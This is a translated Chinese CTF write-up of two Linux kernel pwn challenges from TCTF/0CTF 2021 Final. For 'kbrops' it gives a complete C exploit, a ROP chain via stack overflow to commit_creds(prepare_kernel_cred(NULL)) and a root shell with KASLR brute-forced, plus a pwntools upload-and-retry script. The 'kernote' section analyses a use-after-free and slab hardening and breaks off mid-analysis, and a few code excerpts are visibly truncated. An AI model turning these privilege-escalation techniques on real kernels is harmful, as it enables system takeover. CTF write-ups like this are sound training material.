# TCTF/0CTF 2021-FINAL 两道 kernel pwn 题解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00.一切开始之前
[官方题解见此处](https://github.com/YZloser/My-CTF-Challenges/tree/master/0ctf-2021-final/kernote)
前些日子打了 TCTF 2021 FINAL，其中刚好有两道 Linux kernel pwn
题，笔者在比赛期间没有多少头绪，而这两道题在新星赛中也是全场零解
笔者最近趁有时间把这两道题复现了一下，其中的 kernote 是一道质量十分不错的 kernel UAF，感兴趣的可以抽空复现一下
## 0x01.kbrops
> 签到题难度都算不上，但是需要一点小小的运气…
###  一、题目分析
###  保护
查看 `/sys/devices/system/cpu/vulnerabilities/`
开启了 KPTI（内核页表隔离，一般简称页表隔离（PTI），笔者更喜欢用全称）
查看启动脚本
    #!/bin/bash
    stty intr ^]
    cd `dirname $0`
    timeout --foreground 300 qemu-system-x86_64 \
        -m 256M \
        -enable-kvm \
        -cpu host,+smep,+smap \
        -kernel bzImage \
        -initrd initramfs.cpio.gz \
        -nographic \
        -monitor none \
        -drive file=flag.txt,format=raw \
        -snapshot \
        -append "console=ttyS0 kaslr kpti quiet oops=panic panic=1"
开了 smap、smep、kaslr 保护
在这里并没有像常规的 kernel pwn 那样把 flag 权限设为 root 600 放在文件系统里，而是将 flag
作为一个设备载入，因此我们需要读取 `/dev/sda` 以获取 flag，仍然需要 root 权限
**逆向分析**
整个程序只定义了一个 ioctl 的 0x666 功能，会取我们传入的前两个字节作为后续拷贝的 size，之后 kmalloc 一个
object，从我们传入的第三个字节开始拷贝，之后再从 object 拷贝到栈上，因为两个字节最大就是 0xffff，所以这里直接就有一个裸的栈溢出
###  二、漏洞利用
既然目前有了栈溢出，而且没有 stack canary 保护，比较朴素的提权方法就是执行
`commit_creds(prepare_kernel_cred(NULL))` 提权到 root，但是由于开启了 kaslr，因此我们还需要知道
kernel offset，但是毫无疑问的是只有一个裸的溢出是没法让我们直接泄漏出内核中的数据的
这里 r3kapig 给出的解法是 **假装他没有这个 kaslr，然后直接硬打** ，据称大概试个几百次就能成功
赛后在 discord 群组中讨论，得知 kaslr 的随机化只有 9位，可以直接进行爆破
笔者写了个爆破偏移用的 exp ：
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #include 
    #define PREPARE_KERNEL_CRED 0xffffffff81090c20
    #define COMMIT_CREDS 0xffffffff810909b0
    #define POP_RDI_RET 0xffffffff81001619
    #define SWAPGS_RET 0xffffffff81b66d10
    #define IRETQ_RET 0xffffffff8102984b
    #define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0Xffffffff81c00df0
    size_t user_cs, user_ss, user_rflags, user_sp;
    void saveStatus()
    {
        __asm__("mov user_cs, cs;"
                "mov user_ss, ss;"
                "mov user_sp, rsp;"
                "pushf;"
                "pop user_rflags;"
                );
        printf("\033[34m\033[1m[*] Status has been saved.\033[0m\n");
    }
    void getRootShell(void)
    {   
        puts("\033[32m\033[1m[+] Backing from the kernelspace.\033[0m");
        if(getuid())
        {
            puts("\033[31m\033[1m[x] Failed to get the root!\033[0m");
            exit(-1);
        }
        puts("\033[32m\033[1m[+] Successful to get the root. Execve root shell now...\033[0m");
        system("/bin/sh");
    }
    int main(int argc, char ** argv, char ** envp)
    {
        char    *buf;
        size_t  *stack;
        int     i;
        int     chal_fd;
        size_t  offset;
        offset = (argv[1]) ? atoi(argv[1]) : 0;
        saveStatus();
        buf = malloc(0x2000);
        memset(buf, 'A', 0x2000);
        i = 0;
        stack = (size_t*)(buf + 0x102);
        stack[i++] = *(size_t*)"arttnba3";                 // padding
        stack[i++] = *(size_t*)"arttnba3";                 // rbp
        stack[i++] = POP_RDI_RET + offset;
        stack[i++] = 0;
        stack[i++] = PREPARE_KERNEL_CRED + offset;
        stack[i++] = COMMIT_CREDS + offset;
        stack[i++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 22 + offset;
        stack[i++] = 0;
        stack[i++] = 0;
        stack[i++] = (size_t) getRootShell;
        stack[i++] = user_cs;
        stack[i++] = user_rflags;
        stack[i++] = user_sp;
        stack[i++] = user_ss;
        ((unsigned short *)(buf))[0] = 0x112 + i * 8;
        chal_fd = open("/proc/chal", O_RDWR);
        ioctl(chal_fd, 0x666, buf);
        return 0;
    }
> 这里 ROP 链布局中 `prepare_kernel_cred` 后直接就到 `commit_creds` 是因为经过笔者调试发现在执行完
> `prepare_kernel_cred` 后此时的 rax 与 rdi 都指向 root cred，因此不需要再 `mov rdi, rax`
>
> 
打远程用的脚本：
    from pwn import *
    import base64
    #context.log_level = "debug"
    with open("./exp", "rb") as f:
        exp = base64.b64encode(f.read())
    p = process('./run.sh')#remote("127.0.0.1", 1234)
    try_count = 1
    while True:
        log.info("no." + str(try_count) + " time(s)")
        p.sendline()
        p.recvuntil("~ $")
        count = 0
        for i in range(0, len(exp), 0x200):
            p.sendline("echo -n \"" + exp[i:i + 0x200].decode() + "\" >> b64_exp")
            count += 1
        for i in range(count):
            p.recvuntil("~ $")
        p.sendline("cat b64_exp | base64 -d > ./exploit")
        p.sendline("chmod +x ./exploit")
        randomization = (try_count % 1024) * 0x100000
        log.info('trying randomization: ' + hex(randomization))
        p.sendline("./exploit " + str(randomization))
        if not p.recvuntil(b"Rebooting in 1 seconds..", timeout=60):
            break
        log.warn('failed!')
        try_count += 1
    log.success('success to get the root shell!')
    p.interactive()
运气好的话可以很快拿到 flag，大概只需要爆破几百次左右
## 0x02.kernote
###  一、题目分析
这一题的题解笔者主要还是参照着官方的题解来写的，是本场比赛中给笔者带来收获最大的一道 kernel pwn 题
**文件系统**
与一般的 kernel pwn 题不同的是，这一次给出的文件系统不是简陋的 ramfs 而是常规的 ext4 镜像文件，我们可以使用 `mount`
命令将其挂载以查看并修改其内容
    $ sudo mount rootfs.img /mnt/temp
本地调试时直接将文件复制到挂载点下即可，不需要额外的重新打包的步骤
**保护**
我们首先查看题目提供的 `README.md`：
> Here are some kernel config options in case you need it
>  
>  
>     CONFIG_SLAB=y
>     CONFIG_SLAB_FREELIST_RANDOM=y
>     CONFIG_SLAB_FREELIST_HARDENED=y
>     CONFIG_HARDENED_USERCOPY=y
>     CONFIG_STATIC_USERMODEHELPER=y
>     CONFIG_STATIC_USERMODEHELPER_PATH=""
>  
我们可以看到的是出题人在编译内核时并没有选择默认的 slub 分配器，而是选择了 `slab` 分配器，后续我们解题的过程也与 slab 的特征有关
  * 开启了 Random Freelist（slab 的 freelist 会进行一定的随机化）
  * 开启了 Hardened Freelist（slab 的 freelist 中的 object 的 next 指针会与一个 cookie 进行异或（参照 glibc 的 safe-linking））
  * 开启了 Hardened Usercopy（在向内核拷贝数据时会进行检查，检查 **地址是否存在、是否在堆栈中、是否为 slab 中 object、是否非内核 .text 段内地址等等** ）
  * 开启了 Static Usermodehelper Path（modprobe_path 为只读，不可修改）
接下来分析启动脚本
    #!/bin/sh
    qemu-system-x86_64 \
    -m 128M \
    -kernel ./bzImage \
    -hda ./rootfs.img \
    -append "console=ttyS0 quiet root=/dev/sda rw init=/init oops=panic panic=1 panic_on_warn=1 kaslr pti=on" \
    -monitor /dev/null \
    -smp cores=2,threads=2 \
    -nographic \
    -cpu kvm64,+smep,+smap \
    -no-reboot \
    -snapshot \
    -s
  * 开启了 SMAP & SMEP（用户空间数据访问（access）、执行（execute）保护）
  * 开启了 KASLR（内核地址空间随机化）
  * 开启了 KPTI（内核页表隔离）
**逆向分析**
题目给出了一个内核模块 `kernote.ko`，按惯例这便是存在漏洞的内核模块
拖入 IDA 进行分析，不能看出是常见的内核菜单堆形式，只定义了 ioctl且加了🔒
**0x6667. 分配 object**
0x6667 功能可以分配 object，在这里存在一个全局指针数组 buf 用以存放 object 指针，我们最多可以同时存放 0xF 个 object
指针，而分配的大小限定为 0x8
在这里有一个 slab 与 slub 相不同的点：对于以往的 slub 分配器而言，若是我们 kmalloc(8) 则通常会从 `kmalloc-8`
中取大小为 8 的 object；但是在 slab 源码中有如下定义：
> 内核源码版本5.11，include/linux/slab.h
    #ifdef CONFIG_SLAB
    /*
     * The largest kmalloc size supported by the SLAB allocators is
     * 32 megabyte (2^25) or the maximum allocatable page order if that is
     * less than 32 MB.
     *
     * WARNING: Its not easy to increase this value since the allocators have
     * to do various tricks to work around compiler limitations in order to
     * ensure proper constant folding.
     */
    #define KMALLOC_SHIFT_HIGH    ((MAX_ORDER + PAGE_SHIFT - 1)  阅读源码我们可以发现 slab 为 32， 而 slob 和 slub 都是 8
**0x6666. 保存 object 指针到全局变量 note**
这个功能将 buf 数组中指定 object 指针存放到全局变量 note 中，我们不难想到这里 **可能会有 UAF** ，后续分析我们可以发现确实如此
**0x6668. 释放指定 object**
比较纯粹的 free 功能，注意到这里是释放的 buf 数组内 object 后清空， **但是没有清空 note 数组** ，一个 UAF 已经呼之欲出了
**0x6669. 向 note 指向 object 内写入 8 字节**
UAF 已经贴脸了（）
**0x666A. 打印 note 所存 object 地址（无效功能）**
> 比赛的时候分析得比较痛苦的一个功能…赛后出题人说这个功能写来玩的（🔨）
一开始首先从一个奇怪的地方取了一个值， ~~虽然赛后看出题人写的源代码不是这个样子，但众所周知内核的很多宏展开及多层结构体套娃给逆向工作带来极大困难~~
笔者在比赛期间猜测应当是 `current_task->cred`
中某个值，后面找了对应内核版本源码自己写了个内核模块瞎猜偏移，最后试出来是`current_task->cred->user->__count`
前面这一段代码首先给 `current_task->cred->user` 的引用计数器 `__count` 成员 + 1，对应内核函数
`refcount_inc()` ，多层套娃调用展开后如下：
    static inline void __refcount_add(int i, refcount_t *r, int *oldp)
    {
        int old = atomic_fetch_add_relaxed(i, &r->refs);
        if (oldp)
            *oldp = old;
        if (unlikely(!old))
            refcount_warn_saturate(r, REFCOUNT_ADD_UAF);
        else if (unlikely(old cred->user->__count`，而 `__count`
是 user_struct 结构体的第一个成员，也就是 v6 指向 `current_task->cred->user`
> 赛后看出题人给的源码，这一段代码其实就只是一个 `get_current_user()`
那么下面的代码我们很容易看出是检测 `current_task->cred->user->uid->val`（uid 里面就封装了一个 val） 是否为0
，若为 0 也就是 root 才会进入到 kernote_ioctl_cold 中
最终 kernote_ioctl_cold 会打印 note 中存的 object 的地址， **但是我们一开始肯定不是 root
所以这个功能没有任何意义**
> 这个功能当时还差点让笔者分析错方向，我们前面已经有了一个 UAF，但在此处调用 get_current_user() 时 user
> 的引用计数器（user->__count）自动 + 1，而在结束时并没有让引用计数器自减 1（没有“释放”掉引用），这本身也算是一个
> bug，但实质上与解题是无关的 bug
>
>> 当然，这个 bug 也没法帮助我们完成提权
>